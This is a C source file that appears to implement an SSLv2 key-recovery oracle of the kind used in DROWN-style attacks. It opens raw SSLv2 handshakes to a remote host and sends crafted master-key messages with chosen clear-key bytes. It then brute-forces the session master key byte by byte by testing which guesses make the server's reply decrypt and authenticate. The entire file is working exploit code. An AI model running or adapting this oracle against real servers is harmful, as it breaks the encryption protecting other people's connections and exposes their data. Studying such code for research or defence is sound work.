#include <assert.h> 
#include <openssl/ssl.h>
#include "oracle.h"
#include "ssl_locl.h"


void oracle_ssl2_do_write(SSL *s)
{
    unsigned char *buf = (unsigned char *)s->init_buf->data;
    unsigned int len = s->init_num;

    // We only use two bytes header
    s->s2->wbuf[0]=(len>>8)|0x80;
    s->s2->wbuf[1]=len&0xff;
    memcpy(&(s->s2->wbuf[2]), buf, len);

    // Assume that all data is sent
    BIO_write(s->wbio, (char *)(s->s2->wbuf), len+2);

}

void oracle_ssl2_do_read(SSL *s)
{
    unsigned char *p = s->s2->rbuf;

    // We assume we read an entire record (that seems safe !)
    unsigned int l = BIO_read(s->rbio, p, SSL2_MAX_RECORD_LENGTH_2_BYTE_HEADER+2);

    // Read length
    s->s2->rlength=(((unsigned int)p[0])<<8)|((unsigned int)p[1]);
    if((p[0] & TWO_BYTE_BIT))
    {
        s->s2->three_byte_header = 0;
        s->s2->rlength &= TWO_BYTE_MASK;  
    }
    else
    {
        s->s2->three_byte_header = 1;
        s->s2->rlength &= THREE_BYTE_MASK;
    }
    p += 2;

    // Read padding if any
    if(s->s2->three_byte_header)
        s->s2->padding = *(p++);
    else
        s->s2->padding = 0;

    // Adjust fields if cleartext or not
    s->s2->mac_data = p;
    s->s2->ract_data = p;
    s->s2->ract_data_length = s->s2->rlength;
    if(!s->s2->clear_text)
    {
        unsigned int mac_size = EVP_MD_CTX_size(s->read_hash);
        s->s2->ract_data += mac_size;
        s->s2->ract_data_length -= mac_size;
    }

    
}

void send_client_hello(SSL *s)
{
    unsigned char * buf = (unsigned char *)s->init_buf->data;
    unsigned char * p = buf;
    unsigned char * d = p+9;
    int n;

    // MSG-CLIENT-HELLO
    *(p++) = SSL2_MT_CLIENT_HELLO;

    // CLIENT-VERSION
    s2n(SSL2_VERSION, p);

    // CIPHER-SPECS-DATA
    n = ssl_cipher_list_to_bytes(s, SSL_get_ciphers(s), d, 0);
    d += n;

    // CIPHER-SPECS-LENGTH
    s2n(n, p);

    // SESSION-ID-LENGTH
    s2n(0, p);

    // SESSION-ID-DATA

    // Generate our challenge
    n = SSL2_CHALLENGE_LENGTH;
    s->s2->challenge_length = n;
    memset(s->s2->challenge, 0, n);

    // CHALLENGE-LENGTH
    s2n(n, p);

    // CHALLENGE-DATA
    memset(d, 0, n);
    d += n;

    s->init_num=d-buf;
    //s->init_off=0;

    oracle_ssl2_do_write(s);
}


int recv_server_hello(SSL *s)
{
    unsigned int n;
    oracle_ssl2_do_read(s);
    unsigned char * p = s->s2->ract_data;
    unsigned char * d = p+11;

    // MSG-SERVER-HELLO
    assert(*(p++) == SSL2_MT_SERVER_HELLO);

    // SESSION-ID-HIT
    assert(*(p++) == 0);

    // CERTIFICATE-TYPE
    assert(*(p++) == SSL2_CT_X509_CERTIFICATE);

    // SERVER-VERSION
    unsigned int server_version;
    n2s(p, server_version);
    assert(server_version == SSL2_VERSION);

    // CERTIFICATE-LENGTH
    n2s(p, n);

    // CERTIFICATE
    d += n;

    // CIPHER-SPECS-LENGTH
    n2s(p, n);
    if(n == 0)
        // cipher not supported ?
        return 0;

    // CIPHER-SPECS
    s->session->cipher = s->method->get_cipher_by_char(d);
    assert(s->session->cipher != NULL);
    d += n;

    // CONNECTION-ID-LENGTH
    n2s(p, n);
    s->s2->conn_id_length = n;

    // CONNECTION-ID
    memcpy(s->s2->conn_id, d, n);
    d += n;

    return 1;
}

void send_client_master_key(SSL *s, unsigned char *master_key, unsigned int clear_key_length, unsigned char *encrypted_key, unsigned int encrypted_key_length)
{
    unsigned char * buf = (unsigned char *)s->init_buf->data;
    unsigned char * p = buf;
    unsigned char * d = p+10;
    unsigned int n;
    const EVP_CIPHER *c;
    const EVP_MD *md;
    assert(ssl_cipher_get_evp(s->session, &c, &md, NULL, NULL, NULL) == 1);

    // MSG-CLIENT-MASTER-KEY
    *(p++) = SSL2_MT_CLIENT_MASTER_KEY;

    // CIPHER-KIND
    n = s->method->put_cipher_by_char(s->session->cipher, p);
    p += n;

    // Set master key
    n = clear_key_length;
    s->session->master_key_length = EVP_CIPHER_key_length(c);
    memcpy(s->session->master_key, master_key, s->session->master_key_length);

    // CLEAR-KEY-LENGTH
    s2n(n, p);

    // CLEAR-KEY-DATA
    memcpy(d, master_key, n);
    d += n;

    // ENCRYPTED-KEY-LENGTH
    n = encrypted_key_length;
    s2n(n, p);

    // ENCRYPTED-KEY-DATA
    memcpy(d, encrypted_key, n);
    d += n;

    // Generate key-arg
    n = EVP_CIPHER_iv_length(c);
    s->session->key_arg_length = n;
    memset(s->session->key_arg, 0, n);

    // KEY-ARG-LENGTH
    s2n(n, p);

    // KEY-ARG-DATA
    memset(d, 0, n);
    d += n;

    s->init_num=d-buf;
    //s->init_off=0;

    oracle_ssl2_do_write(s);
}

int oracle_check_valid(SSL *ssl)
{
    ssl->s2->read_sequence = 1;
    // Our crappy recv method only set
    // s->s2->rlength and s->s2->rbuf
    // with the ENTIRE payload

    // We must free the old encryption
    EVP_CIPHER_CTX_free(ssl->enc_write_ctx);
    EVP_CIPHER_CTX_free(ssl->enc_read_ctx);
    ssl->enc_write_ctx = NULL;
    ssl->enc_read_ctx = NULL;

    ssl->s2->clear_text=0;
    assert(ssl2_enc_init(ssl, 1) == 1);

    // Workaround : save the data because ssl2_enc decrypts in-place
    unsigned char *save = malloc(ssl->s2->rlength);
    memcpy(save, ssl->s2->mac_data, ssl->s2->rlength);

    // Need s->s2->rlength, s->s2->mac_data
    assert(ssl2_enc(ssl, 0) == 1);

    // need s->s2->read_sequence, s->s2->ract_data_length, s->s2->ract_data
    unsigned long mac_size = EVP_MD_CTX_size(ssl->read_hash);
    unsigned char mac[mac_size];
    ssl2_mac(ssl, mac, 0);

    int res = CRYPTO_memcmp(mac, ssl->s2->mac_data, mac_size) == 0;

    // Copy back data
    memcpy(ssl->s2->mac_data, save, ssl->s2->rlength);
    free(save);

    return res;
}

int guess_last_byte(SSL* ssl, unsigned char *res)
{
    for(int c = 0; c < 256; c++)
    {
        ssl->session->master_key[ssl->session->master_key_length - 1] = (unsigned char)c;
        if(oracle_check_valid(ssl))
        {
            *res = c;
            return 1;
        }
    }
    return 0;
}


// char *host, short port, char *cipher_kind, int clear_key_size, unsigned char *master_key_guess, int encrypted_key_size, unsigned char *encrypted_key
/*
    Params :
        host, port : remove server address
        keysize : requested jey size
        clear_key
        clear_key_length
        encrypted_key
        encrypted_key_length
*/
SSL * oracle_query(char *hostport, unsigned int keysize, unsigned char *clear_key, unsigned int clear_key_length, unsigned char *encrypted_key, unsigned int encrypted_key_length)
{
    int res;

    // Socket things
    const SSL_METHOD* method = SSLv2_method();
    assert(method != NULL);

    SSL_CTX* ctx = SSL_CTX_new(method);
    assert(ctx != NULL);

    BIO * web = BIO_new_connect(hostport);
    assert(web != NULL);

    SSL * ssl = SSL_new(ctx);
    assert(ssl != NULL);

    res = BIO_do_connect(web);
    assert(res == 1);

    SSL_set_bio(ssl, web, web);

    ssl_get_new_session(ssl, 0);

    unsigned char *ciphers;
    if(keysize == 24)
        ciphers = "DES-CBC3-MD5";
    else if(keysize == 16)
        ciphers = "IDEA-CBC-MD5:RC2-CBC-MD5:RC4-MD5";
    else if(keysize == 8)
        ciphers = "DES-CBC-MD5";
    SSL_set_cipher_list(ssl, ciphers);

    ssl->init_buf = BUF_MEM_new();
    BUF_MEM_grow(ssl->init_buf, SSL2_MAX_RECORD_LENGTH_3_BYTE_HEADER);

    // End SSL init

    // We are connected, great !
    // Now send client hello
    send_client_hello(ssl);
    if(!recv_server_hello(ssl))
        return NULL;
    send_client_master_key(ssl, clear_key, clear_key_length, encrypted_key, encrypted_key_length);
    // Now we can "start" the encryption
    ssl->s2->clear_text=0;
    assert(ssl2_enc_init(ssl, 1) == 1);
    oracle_ssl2_do_read(ssl);

    return ssl;
}

void oracle_free(SSL *s)
{
    SSL_CTX_free(s->ctx); // Weird, this should be freed by SSL_free
    SSL_free(s);
}

int run_oracle_valid(char *hostport, unsigned int keysize, unsigned char *encrypted_key, unsigned int encrypted_key_length)
{
    // Create null master key
    unsigned char clear_key[keysize];
    memset(clear_key, 0, keysize);

    SSL *ssl = oracle_query(hostport, keysize, clear_key, sizeof(clear_key), encrypted_key, encrypted_key_length);
    if(ssl == NULL)
        return 0;

    int res = oracle_check_valid(ssl);

    oracle_free(ssl);

    return res;
}

int run_oracle_valid_multiple(char *hostport, unsigned char *encrypted_key, unsigned int encrypted_key_length)
{
    if(run_oracle_valid(hostport, 24, encrypted_key, encrypted_key_length))
        return 24;
    if(run_oracle_valid(hostport, 16, encrypted_key, encrypted_key_length))
        return 16;
    if(run_oracle_valid(hostport, 8, encrypted_key, encrypted_key_length))
        return 8;
    return 0;
}

int run_oracle_guess(char *hostport, unsigned int keysize, unsigned char *encrypted_key, unsigned int encrypted_key_length, unsigned char *result)
{
    int res;

    unsigned char guess_array[keysize*2];
    memset(guess_array, 0, keysize*2);
    unsigned char *master_key_guess = guess_array;

    // Start with all zeros but one byte, and remove one clear byte each time
    for(int clear_len = keysize - 1; clear_len >= 0; clear_len--) {
        // Do our handshake
        SSL *ssl = oracle_query(hostport, keysize, ++master_key_guess, clear_len, encrypted_key, encrypted_key_length);

        // Brute force the last byte
        res = guess_last_byte(ssl, &master_key_guess[keysize - 1]);
        oracle_free(ssl);
        if(!res)
        {
            return 0;
        }
    }

    memcpy(result, master_key_guess, keysize);

    return 1;
}
